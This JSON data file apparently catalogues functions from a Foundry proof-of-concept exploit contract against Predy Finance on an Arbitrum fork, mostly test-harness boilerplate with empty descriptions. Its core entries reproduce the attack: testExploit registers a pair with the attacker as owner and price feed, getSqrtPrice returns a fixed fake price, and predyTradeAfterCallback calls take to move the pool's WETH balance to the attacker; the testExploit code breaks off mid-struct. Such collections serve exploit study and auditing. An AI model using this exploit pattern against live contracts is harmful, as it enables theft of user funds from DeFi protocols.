[
  {
    "contract/interface": "PredyFinance",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "PredyFinance",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PredyFinance",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PredyFinance",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PredyFinance",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "PredyFinance",
    "source_type": "attacker_contract",
    "function_name": "getSqrtPrice",
    "original_code": "    function getSqrtPrice() external view returns (uint256) {\n        return 40_000_000_000;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "PredyFinance",
    "source_type": "attacker_contract",
    "function_name": "predyTradeAfterCallback",
    "original_code": "    function predyTradeAfterCallback(\n        IPredyPool.TradeParams memory tradeParams,\n        IPredyPool.TradeResult memory tradeResult\n    ) external {\n        predyPool.take(true, address(this), WETH.balanceOf(address(predyPool))); // take the asset to the attacker\n",
    "description": ""
  },
  {
    "contract/interface": "PredyFinance",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"arbitrum\", blocknumToForkFrom);\n        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit\n        fundingToken = address(USDC);\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(predyPool), \"PredyPool\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PredyFinance",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PredyFinance",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PredyFinance",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PredyFinance",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "PredyFinance",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PredyFinance",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PredyFinance",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public balanceLog {\n        USDC.approve(address(predyPool), type(uint256).max);\n        WETH.approve(address(predyPool), type(uint256).max);\n\n        //implement exploit code here\n        AddPairLogic.AddPairParams memory addPairParam = AddPairLogic.AddPairParams({\n            marginId: address(WETH),\n            poolOwner: address(this),\n            uniswapPool: address(0xC6962004f452bE9203591991D15f6b388e09E8D0),\n            priceFeed: address(this),\n            whitelistEnabled: false,\n            fee: 0,\n            assetRiskParams: Perp.AssetRiskParams({\n                riskRatio: 100_000_001,\n                debtRiskRatio: 0,\n                rangeSize: 1000,\n                rebalanceThreshold: 500,\n                minSlippage: 1_005_000,\n                maxSlippage: 1_050_000\n            }),\n            quoteIrmParams: InterestRateModel.IRMParams({\n                baseRate: 10_000_000_000_000_000,\n                kinkRate: 900_000_000_000_000_000,\n                slope1: 500_000_000_000_000_000,\n                slope2: 1_000_000_000_000_000_000\n            }),\n            baseIrmParams: InterestRateModel.IRMParams({\n                baseRate: 10_000_000_000_000_000,\n                kinkRate: 900_000_000_000_000_000,\n                slope1: 500_000_000_000_000_000,\n                slope2: 1_000_000_000_000_000_000\n            })\n",
    "description": ""
  }
]